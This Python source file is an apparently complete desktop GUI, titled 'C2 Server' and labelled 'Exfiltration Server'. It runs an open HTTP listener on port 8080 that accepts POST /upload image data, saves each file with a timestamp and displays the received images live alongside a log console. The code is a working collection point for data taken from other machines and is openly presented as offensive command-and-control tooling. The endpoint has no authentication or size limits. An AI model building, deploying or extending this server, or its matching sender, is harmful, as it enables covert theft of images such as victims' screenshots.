import os
import queue
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

import customtkinter as ctk
from PIL import Image

import theme

COLORS = theme.COLORS

HOST = "0.0.0.0"
DEFAULT_PORT = 8080
UPLOADS_DIR = "uploads"
MIN_DISPLAY_SEC = 1.0


class UploadHandler(BaseHTTPRequestHandler):

    app = None

    def do_POST(self):
        if self.path != "/upload":
            self.send_response(404)
            self.end_headers()
            return

        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            self.send_response(400)
            self.end_headers()
            return

        data = self.rfile.read(content_length)

        content_type = self.headers.get("Content-Type", "image/jpeg")
        ext_map = {
            "image/jpeg": ".jpg",
            "image/png":  ".png",
            "image/gif":  ".gif",
            "image/webp": ".webp",
            "image/bmp":  ".bmp",
        }
        ext = ext_map.get(content_type, ".jpg")

        os.makedirs(UPLOADS_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = f"{ts}{ext}"
        filepath = os.path.join(UPLOADS_DIR, filename)

        with open(filepath, "wb") as f:
            f.write(data)

        if self.app:
            self.app.on_image_received(filepath, len(data))

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass


class LogView(ctk.CTkFrame):

    MAX_LINES = 2000
    TAG_FONT_NORM = ("Courier New", 12)
    TAG_FONT_BOLD = ("Courier New", 12, "bold")

    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.configure(fg_color=COLORS["bg"], corner_radius=12)

        toolbar = ctk.CTkFrame(self, fg_color=COLORS["panel"], corner_radius=8)
        toolbar.pack(fill="x", padx=(10, 0), pady=(10, 0))

        ctk.CTkLabel(
            toolbar, text="◉ LOG CONSOLE",
            font=ctk.CTkFont("Courier New", 11, "bold"),
            text_color=COLORS["accent2"],
        ).pack(side="left", padx=12, pady=6)

        self._auto_scroll = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            toolbar, text="Auto-scroll",
            variable=self._auto_scroll,
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
            fg_color=COLORS["accent"],
            hover_color=COLORS["accent2"],
            checkmark_color="white",
            border_color=COLORS["border"],
        ).pack(side="right", padx=(0, 10))

        ctk.CTkButton(
            toolbar, text="Clear",
            width=60, height=24,
            font=ctk.CTkFont("Courier New", 10),
            fg_color=COLORS["surface"],
            hover_color=COLORS["border"],
            text_color=COLORS["dim"],
            command=self.clear,
        ).pack(side="right", padx=(0, 10))

        self._text = ctk.CTkTextbox(
            self,
            font=ctk.CTkFont("Courier New", 12),
            fg_color=COLORS["bg"],
            text_color=COLORS["fg"],
            border_width=1,
            border_color=COLORS["border"],
            corner_radius=8,
            wrap="none",
            state="disabled",
        )
        self._text.pack(fill="both", expand=True, padx=(10, 0), pady=(10, 0))

        self._setup_tags()
        self._lock = threading.Lock()
        self._line_count = 0

    def _setup_tags(self):
        tb = self._text._textbox
        for key in ("DEBUG", "INFO", "SUCCESS", "WARNING", "ERROR", "CRITICAL"):
            tb.tag_configure(key, foreground=COLORS[key], font=self.TAG_FONT_BOLD)
        tb.tag_configure("ts",   foreground=COLORS["ts"],   font=self.TAG_FONT_NORM)
        tb.tag_configure("name", foreground=COLORS["name"], font=self.TAG_FONT_NORM)
        tb.tag_configure("msg",  foreground=COLORS["fg"],   font=self.TAG_FONT_NORM)

    def append(self, timestamp: str, level: str, name: str, message: str):
        def _do():
            with self._lock:
                tb = self._text._textbox
                tb.configure(state="normal")
                self._line_count += 1
                if self._line_count > self.MAX_LINES:
                    tb.delete("1.0", "2.0")
                    self._line_count -= 1
                tb.insert("end", f"[{timestamp}] ", "ts")
                tb.insert("end", f"{level:<8}", level)
                tb.insert("end", f" {name}: ", "name")
                tb.insert("end", f"{message}\n", "msg")
                tb.configure(state="disabled")
                if self._auto_scroll.get():
                    tb.see("end")
        self._text.after(0, _do)

    def clear(self):
        tw = self._text._textbox
        tw.configure(state="normal")
        tw.delete("1.0", "end")
        tw.configure(state="disabled")
        self._line_count = 0


class ImageView(ctk.CTkFrame):

    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.configure(fg_color=COLORS["bg"], corner_radius=12)

        toolbar = ctk.CTkFrame(self, fg_color=COLORS["panel"], corner_radius=8)
        toolbar.pack(fill="x", padx=(10, 10), pady=(10, 0))

        ctk.CTkLabel(
            toolbar, text="◈ IMAGE VIEWER",
            font=ctk.CTkFont("Courier New", 11, "bold"),
            text_color=COLORS["accent2"],
        ).pack(side="left", padx=12, pady=6)

        self._queue_label = ctk.CTkLabel(
            toolbar, text="Queue: 0",
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
        )
        self._queue_label.pack(side="right", padx=(0, 12))

        self._filename_label = ctk.CTkLabel(
            toolbar, text="—",
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
        )
        self._filename_label.pack(side="right", padx=(0, 12))

        self._img_frame = ctk.CTkFrame(
            self,
            fg_color=COLORS["surface"],
            corner_radius=8,
            border_width=1,
            border_color=COLORS["border"],
        )
        self._img_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self._img_label = ctk.CTkLabel(
            self._img_frame,
            text="Waiting for images...",
            font=ctk.CTkFont("Courier New", 13),
            text_color=COLORS["dim"],
        )
        self._img_label.place(relx=0.5, rely=0.5, anchor="center")

    def show_image(self, img_path: str, queue_size: int = 0):
        def _do():
            try:
                w = self._img_frame.winfo_width()
                h = self._img_frame.winfo_height()
                if w < 10:
                    w, h = 500, 500

                pil_img = Image.open(img_path)
                pil_img.thumbnail((w - 20, h - 20), Image.Resampling.LANCZOS)
                ctk_img = ctk.CTkImage(
                    light_image=pil_img, dark_image=pil_img,
                    size=(pil_img.width, pil_img.height),
                )
                self._img_label.configure(image=ctk_img, text="")
                self._img_label.image = ctk_img
                self._filename_label.configure(text=os.path.basename(img_path))
                self._queue_label.configure(text=f"Queue: {queue_size}")
            except Exception as e:
                self._img_label.configure(text=f"Error loading image:\n{e}", image=None)
        self._img_frame.after(0, _do)

    def update_queue_size(self, size: int):
        self._queue_label.configure(text=f"Queue: {size}")


class C2Server(ctk.CTk):

    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")

        self.title("C2 Server")
        self.geometry("1280x740")
        self.configure(fg_color=COLORS["bg"])

        self._server = None
        self._server_thread = None
        self._img_queue = queue.Queue()
        self._total_received = 0
        self._running = False

        self._init_ui()
        self._start_server()
        self._start_display_loop()

    def _init_ui(self):
        # Header
        hdr = ctk.CTkFrame(self, fg_color=COLORS["panel"], corner_radius=0, height=64)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(
            hdr, text="⬡ C2 Server",
            font=ctk.CTkFont("Courier New", 24, "bold"),
            text_color=COLORS["accent"],
        ).pack(side="left", padx=24)
        ctk.CTkLabel(
            hdr, text="Exfiltration Server - @2ruman",
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
        ).pack(side="right", padx=24)

        # Body
        body = ctk.CTkFrame(self, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=16, pady=(12, 0))
        body.columnconfigure(0, weight=1)
        body.columnconfigure(1, weight=2)
        body.columnconfigure(2, weight=3)
        body.rowconfigure(0, weight=1)
        body.rowconfigure(1, weight=0)

        # Sidebar (col 0)
        sidebar = ctk.CTkFrame(body, fg_color=COLORS["panel"], corner_radius=12)
        sidebar.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        self._init_sidebar(sidebar)

        # Log View (col 1)
        self._log_view = LogView(body)
        self._log_view.grid(row=0, column=1, sticky="nsew", padx=(0, 8))

        # Image View (col 2)
        self._image_view = ImageView(body)
        self._image_view.grid(row=0, column=2, sticky="nsew")

        # Footer
        ctk.CTkLabel(
            body, text="https://github.com/2ruman",
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
        ).grid(row=1, column=2, sticky="es")

    def _init_sidebar(self, parent):
        ctk.CTkLabel(
            parent, text="SERVER CONTROLS",
            font=ctk.CTkFont("Courier New", 11, "bold"),
            text_color=COLORS["accent2"],
        ).pack(pady=(18, 16), padx=16, anchor="w")

        # Profile Image
        img_frame = ctk.CTkFrame(parent, fg_color=COLORS["border"], corner_radius=6)
        img_frame.pack(pady=(0, 16), padx=16)

        img_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "profile", "profile.png")
        if os.path.exists(img_path):
            pil_img = Image.open(img_path)
            pil_img = pil_img.resize((120, 160), Image.Resampling.LANCZOS)
            ctk_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=(120, 160))
            img_label = ctk.CTkLabel(img_frame, image=ctk_img, text="")
            img_label.image = ctk_img
            img_label.pack(padx=2, pady=2)
        else:
            ctk.CTkLabel(
                img_frame, text="NO IMAGE",
                font=ctk.CTkFont("Courier New", 12),
                text_color=COLORS["dim"],
                width=120, height=160,
            ).pack(padx=2, pady=2)

        # Divider
        ctk.CTkFrame(parent, height=2, fg_color=COLORS["border"]).pack(fill="x", padx=16, pady=(0, 16))

        # Status
        status_frame = ctk.CTkFrame(parent, fg_color=COLORS["surface"], corner_radius=8)
        status_frame.pack(fill="x", padx=16, pady=(0, 12))
        ctk.CTkLabel(
            status_frame, text="STATUS",
            font=ctk.CTkFont("Courier New", 9),
            text_color=COLORS["dim"],
        ).pack(anchor="w", padx=10, pady=(8, 2))
        self._status_label = ctk.CTkLabel(
            status_frame, text="● STOPPED",
            font=ctk.CTkFont("Courier New", 12, "bold"),
            text_color=COLORS["ERROR"],
        )
        self._status_label.pack(anchor="w", padx=10, pady=(0, 8))

        # Port
        port_frame = ctk.CTkFrame(parent, fg_color=COLORS["surface"], corner_radius=8)
        port_frame.pack(fill="x", padx=16, pady=(0, 12))
        ctk.CTkLabel(
            port_frame, text="PORT",
            font=ctk.CTkFont("Courier New", 9),
            text_color=COLORS["dim"],
        ).pack(anchor="w", padx=10, pady=(8, 2))
        ctk.CTkLabel(
            port_frame, text=str(DEFAULT_PORT),
            font=ctk.CTkFont("Courier New", 14, "bold"),
            text_color=COLORS["fg"],
        ).pack(anchor="w", padx=10, pady=(0, 8))

        # Received count
        recv_frame = ctk.CTkFrame(parent, fg_color=COLORS["surface"], corner_radius=8)
        recv_frame.pack(fill="x", padx=16, pady=(0, 16))
        ctk.CTkLabel(
            recv_frame, text="RECEIVED",
            font=ctk.CTkFont("Courier New", 9),
            text_color=COLORS["dim"],
        ).pack(anchor="w", padx=10, pady=(8, 2))
        self._received_label = ctk.CTkLabel(
            recv_frame, text="0 images",
            font=ctk.CTkFont("Courier New", 12, "bold"),
            text_color=COLORS["INFO"],
        )
        self._received_label.pack(anchor="w", padx=10, pady=(0, 8))

        # Divider
        ctk.CTkFrame(parent, height=2, fg_color=COLORS["border"]).pack(fill="x", padx=16, pady=(0, 16))

        # Toggle button
        self._toggle_btn = ctk.CTkButton(
            parent, text="■  Stop Server",
            font=ctk.CTkFont("Courier New", 12, "bold"),
            fg_color=COLORS["ERROR"],
            hover_color="#cc3333",
            text_color="white",
            height=36,
            command=self._toggle_server,
        )
        self._toggle_btn.pack(fill="x", padx=16)

        # Uploads path
        ctk.CTkFrame(parent, height=2, fg_color=COLORS["border"]).pack(fill="x", padx=16, pady=(16, 8))
        ctk.CTkLabel(
            parent, text=f"Uploads  »  {UPLOADS_DIR}",
            font=ctk.CTkFont("Courier New", 10),
            text_color=COLORS["dim"],
        ).pack(anchor="w", padx=16)

    def _log(self, level: str, message: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self._log_view.append(ts, level, "server", message)

    def _start_server(self):
        os.makedirs(UPLOADS_DIR, exist_ok=True)
        UploadHandler.app = self
        self._server = HTTPServer((HOST, DEFAULT_PORT), UploadHandler)
        self._running = True
        self._server_thread = threading.Thread(
            target=self._server.serve_forever, daemon=True
        )
        self._server_thread.start()
        self.after(100, lambda: self._update_status(True))
        self.after(150, lambda: self._log("INFO", f"Server listening on {HOST}:{DEFAULT_PORT}"))
        self.after(200, lambda: self._log("INFO", "POST /upload  —  send image files"))
        self.after(250, lambda: self._log("DEBUG", f"Uploads directory: {os.path.abspath(UPLOADS_DIR)}"))

    def _stop_server(self):
        if self._server:
            self._server.shutdown()
            self._server = None
        self._running = False
        self.after(0, lambda: self._update_status(False))
        self.after(0, lambda: self._log("WARNING", "Server stopped"))

    def _toggle_server(self):
        if self._running:
            threading.Thread(target=self._stop_server, daemon=True).start()
        else:
            self._start_server()

    def _update_status(self, running: bool):
        if running:
            self._status_label.configure(text="● RUNNING", text_color=COLORS["INFO"])
            self._toggle_btn.configure(
                text="■  Stop Server",
                fg_color=COLORS["ERROR"],
                hover_color="#cc3333",
            )
        else:
            self._status_label.configure(text="● STOPPED", text_color=COLORS["ERROR"])
            self._toggle_btn.configure(
                text="▶  Start Server",
                fg_color=COLORS["accent"],
                hover_color=COLORS["accent2"],
            )

    def on_image_received(self, filepath: str, size: int):
        """Called from HTTP handler thread — thread-safe via after()"""
        self._img_queue.put(filepath)
        self._total_received += 1
        count = self._total_received
        qsize = self._img_queue.qsize()

        def _update():
            self._received_label.configure(text=f"{count} images")
            self._log("SUCCESS", f"Saved: {os.path.basename(filepath)} ({size:,} bytes)")
            self._log("DEBUG",   f"Queue size: {qsize}")

        self.after(0, _update)

    def _start_display_loop(self):
        def _loop():
            while True:
                filepath = self._img_queue.get()
                qsize = self._img_queue.qsize()
                self.after(0, lambda p=filepath, q=qsize: self._image_view.show_image(p, q))
                time.sleep(MIN_DISPLAY_SEC)

        threading.Thread(target=_loop, daemon=True).start()


if __name__ == "__main__":
    app = C2Server()
    app.mainloop()
